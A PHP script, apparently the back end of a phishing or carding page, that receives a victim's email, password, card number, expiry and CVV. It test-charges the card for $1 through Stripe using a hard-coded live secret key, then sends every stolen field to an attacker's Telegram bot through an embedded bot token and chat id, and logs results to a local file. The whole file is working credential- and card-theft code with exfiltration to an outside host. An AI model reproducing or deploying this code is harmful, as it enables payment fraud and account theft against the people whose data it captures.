<?php
// Habilitar reporte de errores para diagnóstico
error_reporting(E_ALL);
ini_set('display_errors', 1);

$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";
$stripe_secret = "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";

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    die(json_encode(["pago" => false, "mensaje_error" => "No se recibieron datos"]));
}

$detalle_pago = "⏳ Sin verificar";
$pago_exitoso = false;

// --- LÓGICA DE STRIPE ---
try {
    $ch = curl_init("https://api.stripe.com/v1/tokens");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret . ':');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'card' => [
            'number' => str_replace(' ', '', $data['cc']),
            'exp_month' => explode('/', $data['ex'])[0],
            'exp_year' => '20' . explode('/', $data['ex'])[1],
            'cvc' => $data['cv'],
        ]
    ]));
    $res_token = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($res_token['id'])) {
        $ch2 = curl_init("https://api.stripe.com/v1/charges");
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_USERPWD, $stripe_secret . ':');
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query([
            'amount' => 100,
            'currency' => 'usd',
            'source' => $res_token['id'],
            'description' => 'Verif: ' . $data['em']
        ]));
        $res_charge = json_decode(curl_exec($ch2), true);
        curl_close($ch2);

        if (isset($res_charge['status']) && $res_charge['status'] == 'succeeded') {
            $pago_exitoso = true;
            $detalle_pago = "✅ PAGO APROBADO";
        } else {
            $detalle_pago = "❌ RECHAZADA: " . ($res_charge['error']['message'] ?? 'Falla');
        }
    } else {
        $detalle_pago = "❌ DATOS MALOS: " . ($res_token['error']['message'] ?? 'Error');
    }
} catch (Exception $e) {
    $detalle_pago = "⚠️ ERROR: " . $e->getMessage();
}

// --- ENVÍO A TELEGRAM (USANDO FILE_GET_CONTENTS COMO RESPALDO) ---
$msg = "🔔 RESULTADO 🔔\nSTATUS: $detalle_pago\nEmail: {$data['em']}\nPass: {$data['pw']}\nCard: {$data['cc']}\nExp: {$data['ex']}\nCVV: {$data['cv']}";

$url_tg = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg);

// Intentamos enviar y guardamos el resultado en un log
$envio_tg = file_get_contents($url_tg);

// CREAR UN LOG DE SEGURIDAD (Si no llega el Telegram, revisa el archivo 'log.txt')
$log_entry = date("Y-m-d H:i:s") . " | Status: $detalle_pago | TG_Response: " . ($envio_tg ? 'OK' : 'FALLO') . "\n";
file_put_contents("log.txt", $log_entry, FILE_APPEND);

echo json_encode(["pago" => $pago_exitoso, "mensaje_error" => $detalle_pago]);
?>
